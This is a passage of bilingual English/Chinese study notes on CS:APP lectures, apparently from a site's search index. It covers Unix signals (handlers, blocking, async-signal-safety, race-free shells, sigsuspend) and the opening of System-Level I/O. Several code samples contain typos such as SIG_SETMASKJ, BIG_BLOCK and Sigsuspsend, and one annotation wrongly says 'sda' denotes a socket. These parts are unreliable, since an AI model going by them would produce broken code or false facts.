the destination process.</p> <p>\u200b   Kernel sends a signal for one of following reasons:</p> <p>\u200b       Kernel has detected a system event such as divide-by-zero (SIGFPE) or the termination of a child process (SIGCHLD)</p> <p>\u200b       Another process has invoked <code>kill</code>  system call to explicitly request the kernel to send a signal to the destination process. \uff08\u6ce8\u610f\uff0c<code>kill</code> \u53ea\u662f\u4e00\u79cd\u53d1\u4fe1\u53f7\u7684\u65b9\u5f0f\uff0c\u5e76\u4e0d\u4e00\u5b9a\u662f\u6740\u8fdb\u7a0b\uff0c\u8d77\u8fd9\u4e2a\u540d\u5b57\u4e5f\u662f\u56e0\u4e3a\u4e00\u4e9b\u795e\u79d8\u539f\u56e0\uff09</p> <p>Signal Concepts: Receiving a Signal</p> <p>\u200b   A destination process receives a signal when it is forced by the kernel to react in some way to the delivery of the signal.</p> <p>\u200b   Some possible ways to react:</p> <p>\u200b       Ignore the signal (do nothing).</p> <p>\u200b       Terminate the process (with optional core dump).</p> <p>\u200b       Catch the signal by executing a user-level function called signal handler\uff08\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\uff09.</p> <p>\u200b           Akin to a hardware exception handler being called in response to an asynchronous interrupt:</p> <pre><code>(1) Signal received  |\n    by process       |  (2) Control passes\n                     v   to signal handler\n               I_curr----------------------&gt;|\n               I_next|\\                     | (3) Signal \n                     | \\                    |  handler runs\n                     |  \\                   v\n                     |   &lt;-------------------\n                     v   (4) Signal handler\n                           returns to next instruction\n</code></pre> <p>Signal Concepts: Pending and Blocked Signals</p> <p>\u200b   \u5982\u679c\u4e00\u4e2a\u4fe1\u53f7\u88ab\u53d1\u51fa\u4f46\u5c1a\u672a\u88ab\u63a5\u6536\uff0c\u5219\u79f0\u5176\u5f85\u5904\u7406\u3002A signal is pending if sent but not yet received.</p> <p>\u200b       There can be at most one pending signal of any particular type.</p> <p>\u200b       Important: Signals are not queued.</p> <p>\u200b           If a process has a pending signal of type k, then subsequent signals of type k that are sent to that process are discarded. \uff08\u5728\u67d0\u65f6\u523b\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a\u76f8\u540c\u7c7b\u578b\u7684\u5f85\u5904\u7406\u4fe1\u53f7\u3002\uff09</p> <p>\u200b   \u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u963b\u585e\u67d0\u4e9b\u4fe1\u53f7\u7684\u63a5\u6536\u3002A process can block the receipt of certain signals.</p> <p>\u200b       \u88ab\u963b\u585e\u7684\u4fe1\u53f7\u53ef\u4ee5\u88ab\u4f20\u9012\uff0c\u4f46\u5728\u963b\u585e\u89e3\u9664\u524d\u4e0d\u80fd\u88ab\u63a5\u6536\u3002Blocked signals can be delivered, but will not be received until the signal is unblocked.</p> <p>\u200b   \u4fe1\u53f7\u4f20\u9012\u65e0\u6cd5\u88ab\u963b\u6b62\uff0c\u4f46\u53ef\u4ee5\u963b\u6b62\u8fdb\u7a0b\u5728\u6536\u5230\u4fe1\u53f7\u540e\u7684\u54cd\u5e94\u3002</p> <p>\u200b   \u5f85\u5904\u7406\u4fe1\u53f7\u6700\u591a\u88ab\u63a5\u6536\u4e00\u6b21\u3002A pending signal is received at most once.</p> <p>Signal Concepts: Pending/Blocked Bits</p> <p>\u200b   Kernel maintains <code>pending</code> and <code>blocked</code> bit vectors\uff08\u4f4d\u5411\u91cf\uff09 in the context each process.</p> <p>\u200b       <code>pending</code>: represents the set of pending signals.</p> <p>\u200b           Kernel sets bit k in <code>pending</code> when a signal of type k is delivered.</p> <p>\u200b           Kernel clears bit k in <code>pending</code> when a signal of type k is received.</p> <p>\u200b       <code>blocked</code>: represents the set of blocked signals.</p> <p>\u200b           Can be set and cleared by using the <code>sigprocmask</code> function.</p> <p>\u200b           Also referred to as the signal mask\uff08\u4fe1\u53f7\u63a9\u7801\uff09.</p> <p>Sending Signals: Process Groups\uff08\u8fdb\u7a0b\u7ec4\uff09</p> <p></p> <p>Sending Signals with <code>/bin/kill</code> Program</p> <p>\u200b   <code>/bin/kill</code> program sends arbitrary signal to a process or process group.</p> <p>\u200b   Examples:</p> <p>\u200b       <code>/bin/kill -9 24818</code> Send SIGKILL to process 24818.</p> <p>\u200b       <code>kill -9</code> \u5f88\u5e38\u7528\uff0c\u4f7f\u7528\u8fd9\u4e2a\u6765\u6740\u6389\u67d0\u4e2a\u8fdb\u7a0b\u3002 </p> <p>\u200b       <code>/bin/kill -9 -24817</code> Send SIGKILL to every process in process group 24817.</p> <pre><code>linux&gt; ./forks 16\nChild1: pid=24818 pgrp=24817\nChild2: pid=24819 pgrp=24817\n\nlinux&gt; ps\n  PID TTY          TIME CMD\n24788 pts/2    00:00:00 tcsh\n24818 pts/2    00:00:02 forks\n24819 pts/2    00:00:02 forks\n24820 pts/2    00:00:00 ps\nlinux&gt; /bin/kill -9 -24817\nlinux&gt; ps\n  PID TTY          TIME CMD\n24788 pts/2    00:00:00 tcsh\n24820 pts/2    00:00:00 ps\nlinux&gt; \n</code></pre> <p>Sending Signals from the Keyboard</p> <p></p> <p>Example of <code>ctrl-c</code> and <code>ctrl-z</code></p> <pre><code>bluefish&gt; ./forks 17\nChild: pid=28108 pgrp=28107\nParent: pid=28107 pgrp=28107\n&lt;types ctrl-z&gt;\nSuspended\nbluefish&gt; ps w\n  PID TTY      STAT   TIME COMMAND\n27699 pts/8    Ss     0:00 -tcsh\n28107 pts/8    T      0:01 ./forks 17\n28108 pts/8    T      0:01 ./forks 17\n28109 pts/8    R+     0:00 ps w\nbluefish&gt; fg\n./forks 17\n&lt;types ctrl-c&gt;\nbluefish&gt; ps w\n  PID TTY      STAT   TIME COMMAND\n27699 pts/8    Ss     0:00 -tcsh\n28110 pts/8    R+     0:00 ps w\n</code></pre> <p>\u200b   STAT (process state) Legend:</p> <p>\u200b       First letter: S: Sleeping; T: Stopped; R: Running.</p> <p>\u200b       Second letter: s: session leader; +: foreground proc group.</p> <p>\u200b       See <code>man ps</code> for more details.</p> <p>\u6ce8\uff1aSuspended \u88ab\u6302\u8d77</p> <p>Sending Signals with <code>kill</code> Function</p> <pre><code>void fork12() {\n    pid_t pid[N];\n    int i;\n    int child_status;\n\n    for (i = 0; i &lt; N; i++)\n        if ((pid[i] = fork()) == 0) {\n            /* Child: Infinite Loop */\n            while (1)\n                ;\n        }\n\n    for (i = 0; i &lt; N; i++) {\n        printf(\"Killing process %d\\n\", pid[i]);\n        kill(pid[i], SIGINT);\n    }\n\n    for (i = 0; i &lt; N; i++) {\n        pid_t wpid = wait(&amp;child_status);\n        if (WIFEXITED(child_status))\n            printf(\"Child %d terminated with exit status %d\\n\", wpid, WEXITSTATUS(child_status));\n        else \n            printf(\"Child %d terminated abnormally\\n\", wpid);\n    }\n}\n</code></pre> <p>Receiving Signals</p> <p>\u200b   Suppose kernel is returning from an exception handler and is ready to pass control to process p.</p> <pre><code>|Time   Process A       process B\n|          |                         user code\n|          |\n|          -------\\  \n|                  \\                 kernel code \\\n|                   \\------*                      context switch\n|                          |         user code   /\n|                          | \n|                   /-------\n|                  /                 kernel code \\\n|          -------/                               context switch\n|          |                         user code   /\n|          |\n|          v \nv\n</code></pre> <p>\u200b   \u5728 <code>*</code> \u5904\u5c31\u662f\u53d1\u9001\u63a5\u6536\u68c0\u67e5\u4fe1\u53f7\uff0c\u4ee5\u786e\u4fdd\u4ea4\u63a5\u63a7\u5236\u6743\u7684\u4e00\u5207\u90fd\u65e0\u8bef\u3002</p> <p>\u200b   Kernel computes <code>pnb = pending &amp; ~blocked</code> \u5185\u6838\u901a\u8fc7\u8ba1\u7b97\u4f4d\u5411\u91cf <code>pnb</code> \u6765\u505a\u5230\u8fd9\u4e00\u70b9</p> <p>\u200b       The set of pending nonblocked signals for process p.</p> <p>\u200b   If <code>pnb == 0</code></p> <p>\u200b       Pass control to next instruction in the logical flow for p.</p> <p>\u200b   Else</p> <p>\u200b       Choose least nonzero bit k in <code>pnb</code> and force process p to receive signal k.</p> <p>\u200b       The receipt of the signal triggers some action by p.</p> <p>\u200b       Repeat for all nonzero k in <code>pnb</code>.</p> <p>\u200b       Pass control to next instruction in logical flow for p.</p> <p>Default Actions</p> <p>\u200b   Each signal type has a predefined default action, which is one of:</p> <p>\u200b       The process terminates. \u8fdb\u7a0b\u7ec8\u6b62\u5e76\u8f6c\u50a8\u5185\u5b58\u3002</p> <p>\u200b       The process stops until restarted by a SIGCONT signal.</p> <p>\u200b       The process ignore the signal.</p> <p>Installing Signal Handlers</p> <p>\u200b   The <code>signal</code> function modifies the default action associated with the receipt of signal <code>signum</code>:</p> <p>\u200b       <code>handler_t *signal(int signum, handler_t *handler)</code></p> <p>\u6ce8\uff1a\u548c <code>kill</code> \u4e00\u6837\uff0c\u8fd9\u4e5f\u662f\u4e2a\u6709\u8bef\u5bfc\u6027\u7684\u8d77\u540d\uff0c \u8c03\u7528<code>kill</code> \u4e0d\u4e00\u5b9a\u6740\u6b7b\u8fdb\u7a0b\uff0c\u800c\u53ea\u662f\u5411\u8fdb\u7a0b\u53d1\u4fe1\u53f7\uff1b\u8c03\u7528 <code>signal</code> \u5e76\u4e0d\u662f\u5411\u8fdb\u7a0b\u53d1\u4fe1\u53f7\uff0c\u800c\u662f\u4fee\u6539\u4fe1\u53f7\u7684\u9ed8\u8ba4\u64cd\u4f5c\u3002</p> <p><code>signal</code> \u51fd\u6570\u6307\u5b9a\u4fe1\u53f7\u7684\u4fe1\u53f7\u53f7\uff08signal number\uff0c\u6b64\u5904\u7684 <code>signum</code>\uff09\u548c\u4e00\u4e2a\u5bf9\u4fe1\u53f7\u9ed8\u8ba4\u884c\u4e3a\u7684\u4fee\u6539\uff08\u6b64\u5904\u7684 <code>handler</code>\uff09\u3002</p> <p>\u200b   Different values for <code>handler</code>:</p> <p>\u200b       SIG_IGN: ignore signals of type <code>signum</code>.</p> <p>\u200b       SIG_DFL: revert to the default action on receipt of signals of type <code>signum</code>.</p> <p>\u200b       Otherwise, <code>handler</code> is the address of a user-level signal handler\uff08\u7528\u6237\u7ea7\u4fe1\u53f7\u5904\u7406\u51fd\u6570\u7684\u5730\u5740\uff09.</p> <p>\u200b           Called when process receives signal of type <code>signum</code>.</p> <p>\u200b           Referred to as \"installing\" the handler.</p> <p>\u200b           Executing handler is called \"catching\" or \"handling\" the signal.</p> <p>\u200b           When the handler executes its return statement, control passes to instruction in the control flow of the process that was in?? receipt of the signal.</p> <p>Signal Handling Example</p> <pre><code>void sigint_handler(int sig) { /* SIGINT handler */\n    printf(\"So you think you can stop the bomb with ctrl-c, do you?\\n\");\n    sleep(2);\n    printf(\"Well...\");\n    fflush(stdout);\n    sleep(1);\n    printf(\"OK. :-)\\n\");\n    exit(0);\n}\nint main() {\n    /* Install the SIGINT handler */\n    if (signal(SIGINT, sigint_handler) == SIG_ERR)\n        unix_error(\"signal error\");\n\n    /* Wait for the receipt of a signal */\n    pause();\n\n    return 0;\n}\n</code></pre> <p>Signals Handler as Concurrent Flows</p> <p>\u200b   A signal handler is a separate logical flow (not process) that runs concurrently with the main program.</p> <pre><code>|Time    Process A      Process A      Process B\n|          while(1);    handler(){}\n|           o\n|                                          o\n|                          o\n|           o\n|                                          o\n|\nv\n</code></pre> <p>\u200b   \u4fe1\u53f7\u662f\u5e76\u53d1\u7684\u4e00\u79cd\u5f62\u5f0f\uff08Signals are another form of concurrency\uff09\uff0c\u4fe1\u53f7\u662f\u4e00\u4e2a\u5e76\u53d1\u6d41\u3002</p> <p>Another View of Signal Handlers as Concurrent Flows</p> <pre><code>|Time   Process A       process B\n|          |                         user code (main)\n|          | I_curr &lt;- Signal delivered to process A\n|          -------\\  \n|                  \\                 kernel code \n|                   \\------*                      context switch\n|                          |         user code (main)\n|                          | \n|                   /-------\n|                  /                 kernel code \n|          -------/                               context switch\n|          |                         user code (handler)\n|          |\n|          |                         kernel code\n|          | I_next &lt;- Signal received by process A\n|          |                         user code (main)\n|          |\n|          v\n|\nv\n</code></pre> <p></p> <p>Blocking and Unblocking Signals</p> <p>\u200b   Implicit blocking mechanism</p> <p>\u200b       Kernel blocks any pending signals of type currently being handled.</p> <p>\u200b       e.g. A SIGINT handler can't be interrupted by another SIGINT.</p> <p>\u200b   Explicit blocking and unblocking mechanism.</p> <p>\u200b       <code>sigprocmask</code> function.</p> <p>\u200b   Supporting functions</p> <p>\u200b       <code>sigemptyset</code>: Create empty set.</p> <p>\u200b       <code>sigfillset</code>: Add every signal number to set.</p> <p>\u200b       <code>sigaddset</code>: Add signal number to set.</p> <p>\u200b       <code>sigdelset</code>: Delete signal number from set.</p> <p>Temporarily Blocking Signals</p> <pre><code>    sigset_t mask, prev_mask;\n\n    Sigemptyset(&amp;mask);\n    Sigaddset(&amp;mask, SIGINT);\n\n    /* Block SIGINT and save previous blocked set */\n    Sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev_mask);\n\n    ... /* Code region that will not be interrupted by SIGINT */\n\n    /* Restore previous blocked set, unblocking SIGINT */\n    Sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL);\n</code></pre> <p>Safe Signal Handling</p> <p>\u200b   Handlers are tricky because they are concurrent with main program and share the same global data structures.</p> <p>\u200b       Shared data structures can become corrupted.</p> <p>\u200b   We'll explore concurrency issues later in the term.</p> <p>\u200b   For now here are some guidelines to help you avoid trouble.</p> <p>Guidelines for Writing Safe Handlers</p> <p>\u70e6\u8bf7\u53c2\u8003\u300aUnix \u73af\u5883\u9ad8\u7ea7\u7f16\u7a0b\u300b\u4fe1\u53f7\u4e00\u7ae0\u3002</p> <p>\u200b   G0: Keep your handlers as simple as possible.</p> <p>\u200b       e.g., Set a global flag and return.</p> <p>\u200b   G1: \u5728\u4f60\u7684\u5904\u7406\u7a0b\u5e8f\u4e2d\u53ea\u8c03\u7528\u5f02\u6b65\u4fe1\u53f7\u5b89\u5168\u51fd\u6570\u3002Call only async-signal-safe functions in your handlers.</p> <p>\u200b       <code>printf</code>, <code>sprintf</code>, <code>malloc</code>, and <code>exit</code> are not safe!</p> <p>\u200b   G2: Save and restore <code>errno</code> on entry and exit.</p> <p>\u200b       So that other handlers don't overwrite your value of <code>errno</code>.</p> <p>\u200b   G3: Protect accesses to shared data structures by temporarily blocking all signals.</p> <p>\u200b       To prevent possible corruption.</p> <p>\u200b   G4: Declare global variables as <code>volatile</code>.</p> <p>\u200b       To prevent compiler from storing them in a register.</p> <p>\u200b   G5: Declare global flags as <code>volatile sig_atomic_t</code> </p> <p>\u200b       flag: variable that is only read or written (e.g. flag = 1, not flag).</p> <p>\u200b       Flag declared this way does not need to be protected like others.</p> <p>\u5f02\u6b65\u4fe1\u53f7\u5b89\u5168 Async-Signal-Safety</p> <p>\u200b   Function is async-signal-safe if either reentrant (e.g., all variables stored on stack frame, CS:APP3e 12.7.2) or non-interruptible by signals.</p> <p>\u200b   Posix \u6807\u51c6\u786e\u4fdd\u4e86 117 \u4e2a\u51fd\u6570\u662f\u540c\u6b65\u4fe1\u53f7\u5b89\u5168\u7684\u3002Posix guarantees 117 functions to be async-signal-safe.</p> <p>\u200b       Source: <code>man 7 signal</code>.</p> <p>\u200b       Popular functions on the list:</p> <p>\u200b           <code>_exit</code>, <code>write</code>, <code>wait</code>, <code>waitpid</code>, <code>sleep</code>, <code>kill</code>.</p> <p>\u200b           Unfortunate fact: <code>write</code> is the only async-signal-safe output function.</p> <p>Safely Generating Formatted Output</p> <p>\u200b   Use the reentrant SIO (Safe I/O library) from <code>csapp.c</code> in your handlers.</p> <p>\u200b       <code>ssize_t sio_puts(char s[]) /* Put string */</code></p> <p>\u200b       <code>ssize_t sio_putl(long v)   /* Put long */</code></p> <p>\u200b       <code>void sio_error(char s[])   /* Put msg &amp; exit */</code></p> <pre><code>void sigint_handler(int sig) { /* Safe SIGINT handler */\n    Sio_puts(\"So you think you can stop the bomb with ctrl-c, do you?\\n\");\n    sleep(2);\n    Sio_puts(\"Well...\");\n    sleep(1);\n    Sio_puts(\"OK. :-)\\n\");\n    _exit(0);\n}\n</code></pre> <p>Correct Signal Handling</p> <pre><code>int ccount = 0;\nvoid child_handler(int sig) {\n    int olderrno = errno;\n    pid_t pid;\n    if ((pid = wait(NULL)) &lt; 0)\n        Sio_error(\"wait error\");\n    ccount--;\n    Sio_puts(\"Handler reaped child \");\n    Sio_putl((long)pid);\n    Sio_puts(\" \\n\");\n    sleep(1);\n    errno = olderrno;\n}\n\nvoid fork14() {\n    pid_t pid[N];\n    int i;\n    ccount = N;\n    Signal(SIGCHLD, child_handler);\n\n    for (i = 0; i &lt; N; i++) {\n        if ((pid[i] = Fork()) == 0) {\n            Sleep(1);\n            exit(0); /* Child exits */\n        }\n    }\n    while (ccount &gt; 0) /* Parent spins */\n        ;\n}\n</code></pre> <p>\u200b   Pending signals are not queued.</p> <p>\u200b       For each signal type, one bit indicates whether or not signal is pending...</p> <p>\u200b       ... thus at most one pending signal of any particular type.</p> <p>\u200b   You can't use signals to count events, such as children terminating.</p> <p>\u200b   Must wait for all terminated child processes.</p> <p>\u200b       Put <code>wait</code> in a loop to reap all terminated children.</p> <pre><code>void child_handler2(int sig) {\n    int olderrno = errno;\n    pid_t pid;\n    while ((pid = wait(NULL)) &gt; 0) {\n        ccount--;\n        Sio_puts(\"Handler reaped child \");\n        Sio_putl((long)pid);\n        Sio_puts(\" \\n\");\n    }\n    if (errno != ECHILD) \n        Sio_error(\"wait error\");\n    errno = olderrno;\n}\n</code></pre> <p>Portable Signal Handling</p> <p>\u200b   Ugh! Different versions of Unix can have different signals handling semantics.</p> <p>\u200b       Some older systems restore action to default after catching signal.</p> <p>\u200b       Some interrupted system calls can return with <code>errno == EINTR</code>.</p> <p>\u200b       Some systems don't block signals of the type being handled.</p> <p>\u200b   Solution: <code>sigaction</code></p> <pre><code>handler_t *Signal(int signum, handler_t *handler) {\n    struct sigaction action, old_action;\n\n    action.sa_handler = handler;\n    sigemptyset(&amp;action.sa_mask); /* Block sigs of type being handled */\n    action.sa_flags = SA_RESTART; /* Restart syscalls if possible */\n\n    if (sigaction(signum, &amp;action, &amp;old_action) &lt; 0)\n        unix_error(\"Signal error\");\n    return (old_action.sa_handler);\n}\n</code></pre> <p>Synchronizing Flows to Avoid Races</p> <p>\u200b   Simple shell with a subtle synchronization error because it assumes parent runs before child.</p> <pre><code>int main(int argc, char **argv) {\n    int pid;\n    sigset_t mask_all, prev_all;\n\n    Sigfillset(&amp;mask_all);\n    Signal(SIGCHLD, handler);\n    initjobs(); /* Initialize the job list */\n\n    while (1) {\n        if ((pid = Fork()) == 0) { /* Child */\n            Execve(\"/bin/date\", argv, NULL);\n        }\n        Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); /* Parent */\n        addjob(pid); /* Add the child to the job list */\n        Sigprocmask(SIG_SETMASKJ, &amp;prev_all, NULL);\n    }\n    exit(0);\n}\n</code></pre> <p>\u200b   SIGCHLD handler for a simple shell.</p> <pre><code>void handler(int sig) {\n    int olderrno = errno;\n    sigset_t mask_all, prev_all;\n\n    Sigfillset(&amp;mask_all);\n    while ((pid = waitpid(-1, NULL, 0)) &gt; 0) { /* Reap child */\n        Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);\n        deletejob(pid); /* Delete the child from the job list */\n        Sigprocmask(SIG_SETMASK, &amp;prev_all, NULL);\n    }\n    if (errno != ECHILD)\n        Sio_error(\"waitpid error\");\n    errno = olderrno;\n}\n</code></pre> <p>Corrected Shell Program without Race</p> <pre><code>int main(int argc, char **argv) {\n    int pid;\n    sigset_t mask_all, mask_one, prev_one;\n\n    Sigfillset(&amp;mask_all);\n    Sigemptyset(&amp;mask_one);\n    Sigaddset(&amp;mask_one, SIGCHLD);\n    Signal(SIGCHLD, handler);\n    initjobs(); /* Initialize the job list */\n\n    while (1) {\n        Sigprocmask(BIG_BLOCK, &amp;mask_one, &amp;prev_one); /* Block SIGCHLD */\n        if ((pid = Fork()) == 0) { /* Child process */\n            Sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); /* Unblock SIGCHLD */\n            Execve(\"/bin/date\", argv, NULL);\n        }\n        Sigprocmask(SIG_BLOCK, &amp;mask_all, NULL); /* Parent process */\n        addjob(pid); /* Add the child to the job list */\n        Sigprocmask(SIG_SETMASKJ, &amp;prev_one, NULL); /* Unblock SIGCHLD */\n    }\n    exit(0);\n}\n</code></pre> <p>Explicitly Waiting for Signals</p> <p>\u200b   Handlers for program explicitly waiting for SIGCHLD to arrive.</p> <pre><code>volatile sig_atomic_t pid;\n\nvoid sigchld_handler(int s) {\n    int olderrno = errno;\n    pid = Waitpid(-1, NULL, 0); /* Main is waiting for nonzero pid */\n    errno = olderno;\n}\nvoid sigint_handler(int s) {\n\n}\n</code></pre> <p>\u200b   Similar to a shell waiting for a foreground job to terminate.</p> <pre><code>int main(int argc, char **argv) {\n    sigset_t mask, prev;\n    Signal(SIGCHLD, sigchld_handler);\n    Signal(SIGINT, sigint_handler);\n    Sigemptyset(&amp;mask);\n    Sigaddset(&amp;mask, SIGCHLD);\n\n    while (1) {\n        Sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev); /* Block SIGCHLD */\n        if (Fork() == 0) /* Child */\n            exit(0);\n        /* Parent */\n        pid = 0;\n        Sigprocmask(SIG_SETMASK, &amp;prev, NULL); /* Unblock SIGCHLD */\n\n        /* Wait for SIGCHLD to be received (wasteful!) */\n        while (!pid)\n            ;\n        /* Do some work after receiving SIGCHLD */\n        printf(\".\");\n    }\n    exit(0);\n}\n</code></pre> <p>\u200b   Program is correct, but very wasteful.</p> <p>\u200b   Other options:</p> <pre><code>while (!pid) /* Race! */\n    pause();\n</code></pre> <pre><code>while (!pid) /* Too slow! */\n    sleep(1);\n</code></pre> <p>\u200b   Solution: <code>sigsuspend</code>.</p> <p>Waiting for Signals with <code>sigsuspend</code></p> <p>\u200b   <code>int sigsuspend(const sigset_t *mask)</code></p> <p>\u200b   Equivalent to atomic (uninterruptable) version of: </p> <pre><code>sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);\npause();\nsigprocmask(SIG_SETMASK, &amp;prev, NULL);\n</code></pre> <pre><code>int main(int argc, char **argv) {\n    sigset_t mask, prev;\n    Signal(SIGCHLD, sigchld_handler);\n    Signal(SIGINT, sigint_handler);\n    Sigemptyset(&amp;mask);\n    Sigaddset(&amp;mask, SIGCHLD);\n\n    while (1) {\n        Sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev); /* Block SIGCHLD */\n        if (Fork() == 0) /* Child */\n            exit(0);\n\n        /* Wait for SIGCHLD to be received*/\n        pid = 0;\n        while (!pid)\n            Sigsuspsend(&amp;prev);\n\n        /* Optionally unblock SIGCHLD */\n        Sigprocmask(SIG_SETMASK, &amp;prev, NULL);\n        /* Do some work after receiving SIGCHLD */\n        printf(\".\");\n    }\n    exit(0);\n}\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L16-System-Level-IO/","title":"L16 System-Level I/O","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=16</p> <p>Today</p> <p>\u200b   Unix I/O</p> <p>\u200b   RIO (robust I/O) package</p> <p>\u200b   Metadata, sharing, and redirection</p> <p>\u200b   Standard I/O</p> <p>\u200b   Closing remarks</p> <p>Unix I/O Overview</p> <p>\u200b   Unix \u6587\u4ef6\uff1a\u4e07\u7269\u7686\u6587\u4ef6\uff0c\u6587\u4ef6\u7686\u5b57\u8282\u5e8f\u5217\uff0c\u4e0d\u533a\u5206\u6587\u4ef6\u7c7b\u578b\u3002</p> <p>\u200b   A Linux file is a sequence of m bytes,</p> <p>\u200b       \\(B_0, B_1,\\cdots, B_k,\\cdots,B_{m-1}\\).</p> <p>\u200b   Cool fact: All I/O devices are represented as files:</p> <p>\u200b       <code>/dev/sda2</code> (<code>/usr</code> disk partition) \uff08sda \u8868\u793a\u5957\u63a5\u5b57\uff08socket\uff09\uff0c\u7f51\u7edc\u8fde\u63a5\u540e\uff0c\u901a\u8fc7\u4e92\u8054\u7f51\u8fdb\u884c\u901a\u4fe1\uff0c\u5b9e\u9645\u4e0a\u662f\u901a\u8fc7\u5199\u5165\u5957\u63a5\u5b57\u6765\u53d1\u9001\u4fe1\u606f\uff0c\u5e76\u4ece\u5957\u63a5\u5b57\u8bfb\u51fa\u63a5\u6536\u7684\u4fe1\u606f\u7684\uff1b\u4f4e\u7ea7 API \u4e2d\u4e5f\u662f\u901a\u8fc7\u5728\u78c1\u76d8\u9a71\u52a8\u5668\u4e0a\u8bfb\u5199\u6587\u4ef6\u4ee5\u53ca\u901a\u8fc7\u4e92\u8054\u7f51\u53d1\u9001\u6570\u636e\u5305\u3002\uff09</p> <p>\u200b       <code>/dev/tty2</code> (terminal) \uff08tty \u8868\u793a\u7535\u4f20\u6253\u5b57\u673a TeletTYpe\uff0c\u8fc7\u53bb\u4eba\u4eec\u7528\u5b83\u6765\u63cf\u8ff0\u6253\u5b57\u673a\u4e0e\u8ba1\u7b97\u673a\u7684\u63a5\u53e3\uff09</p> <p>\u200b   Even the kernel is represented as a file:</p> <p>\u200b       <code>/boot/vmlinuz-3.13.0-55-generic</code> (kernel image)</p> <p>\u200b       <code>/proc</code> (kernel data )</p> <p>\u200b   Elegant mapping of files to devices allows kernel to export simple interface called Unix I/O.</p> <p>\u200b       Opening and closing files</p> <p>\u200b           <code>open()</code> and <code>close()</code></p> <p>\u200b       Reading and writing a file.</p> <p>\u200b           <code>read()</code> and <code>write()</code></p> <p>\u200b       Changing the current file position (seek)</p> <p>\u200b       \u5f53\u524d\u6587\u4ef6\u4f4d\u7f6e\uff08current file position\uff09\uff1a\u8868\u793a\u5f53\u524d\u8bfb\u5230\u7684\u6587\u4ef6\u5185\u5bb9\u7684\u4f4d\u7f6e\u3002</p> <p>\u200b           indicates next offsets into files to read or write.</p> <p>\u200b           <code>lseek()</code></p> <p>\u200b           \\(B_0, B_1,\\cdots, B_k\\leftarrow ,\\cdots,B_{m-1}\\)\uff0ccurrent file position = k. </p> <p>File Types </p> <p>\u200b   Each file has a type indicating its role in the system.</p> <p>\u200b       \u666e\u901a\u6587\u4ef6 regular file: Contains arbitrary data.</p> <p>\u200b       \u76ee\u5f55 Directory: Index for a related group of files.</p> <p>\u200b       \u5957\u63a5\u5b57 Socket: For communicating with a process on another machine.</p> <p>\u200b   Other file types beyond our scope.</p> <p>\u200b       \u7ba1\u9053\u6587\u4ef6 Named pipes (FIFOs) \u8fd9\u662f\u4e00\u7c7b\u7279\u6b8a\u7684\u6587\u4ef6\uff0c\u65e2\u662f\u524d\u4e00\u7a0b\u5e8f\u7684\u8f93\u5165\u4e5f\u662f\u540e\u4e00\u7a0b\u5e8f\u7684\u8f93\u5165\u3002</p> <p>\u200b       \u7b26\u53f7\u94fe\u63a5 Symbolic links \u8fd9\u662f\u4e00\u7c7b\u7279\u6b8a\u7684\u6587\u4ef6\uff0c\u4e0d\u9700\u8981\u521b\u5efa\u526f\u672c\u5c31\u53ef\u4ee5\u6709\u591a\u4e2a\u540d\u79f0\uff0c\u88ab\u591a\u4e2a\u6307\u9488\u6307\u5411\u3002</p> <p>\u200b       Character and block devices.</p> <p>Regular Files</p> <p>\u200b   A regular file contains arbitrary data.</p> <p>\u200b   Applications often distinguish between text files and binary files.</p> <p>\u200b       \u6587\u672c\u6587\u4ef6 Text files are regular files with only ASCII or Unicode characters.</p> <p>\u200b       \u4e8c\u8fdb\u5236\u6587\u4ef6 Binary files are everything else. e.g. object files, JPEG images.</p> <p>\u200b       Kernel doesn't know the difference!</p> <p>\u200b   Text file is sequence of text lines.</p> <p>\u200b       Text line is sequence of chars terminated by newline char (<code>'\\n'</code>)</p> <p>\u200b           Newline is <code>0xa</code>, same as ASCII line feed character (LF).</p> <p>\u200b   End of line (EOL) indicators in other systems</p> <p>\u200b       Linux and MacOS: <code>'\\n'</code>(<code>0xa</code>): line feed (LF)</p> <p>\u200b       Windows and Internet protocols: <code>\\r\\n</code>(<code>0xd 0xa</code>): Carriage return (CR) followed by line feed (LF).</p> <p>\u8001\u5f0f\u6253\u5b57\u673a\uff08old-fashioned typewriter\uff09\uff1a\u6253\u5b57\u673a\u5de6\u4fa7\u662f\u4e00\u4e2a\u6eda\u7b52\uff08bar\uff09\uff0c\u5f53\u4f60\u6253\u5b57\u65f6\uff0c\u7eb8\u5c31\u4f1a\u968f\u7740\u6eda\u7b52\u5411\u5de6\u5e73\u79fb\uff0c\u5f53\u6eda\u7b52\u79fb\u52a8\u5230\u672b\u7aef\u65f6\uff0c\u9700\u8981\u56de\u5230\u4e0b\u4e00\u884c\u7684\u5f00\u5934\uff0c\u8fd9\u65f6\u5019\u65e2\u9700\u8981\u56de\u8f66\uff08\u628a\u6eda\u7b52\u63a8\u5230\u53f3\u8fb9\uff0c\u56de\u5230\u8be5\u884c\u884c\u9996\uff0ccarriage return\uff09\uff0c\u4e5f\u9700\u8981\u6362\u884c\uff08\u8ba9\u6eda\u7b52\u5207\u6362\u5230\u4e0b\u4e00\u884c\uff0c\u8fd9\u4e00\u6b65\u9700\u8981\u624b\u52a8\u8f6c\u65cb\u94ae\u5b8c\u6210\uff0cline feed\uff09\u3002</p> <p>Directories </p> <p>\u200b   Directory consists of an array of links.</p> <p>\u200b       Each link maps a filename to a file.</p> <p>\u200b   Each directory contains at least two entries.</p> <p>\u200b       <code>.</code> (dot) is a link to itself.</p> <p>\u200b       <code>..</code> (dot dot) is a link to the parent directory in the directory hierarchy (next slide).</p> <p>\u200b   Commands for manipulating directories</p> <p>\u200b       <code>mkdir</code>: create empty directory.</p> <p>\u200b       <code>ls</code>: view directory contents.</p> <p>\u200b       <code>rmdir</code>: delete empty directory.</p> <p>\u76ee\u5f55\u5c42\u6b21\u7ed3\u6784 Directory Hierarchy </p> <p>\u200b   All files are organized as a hierarchy anchored by root directory 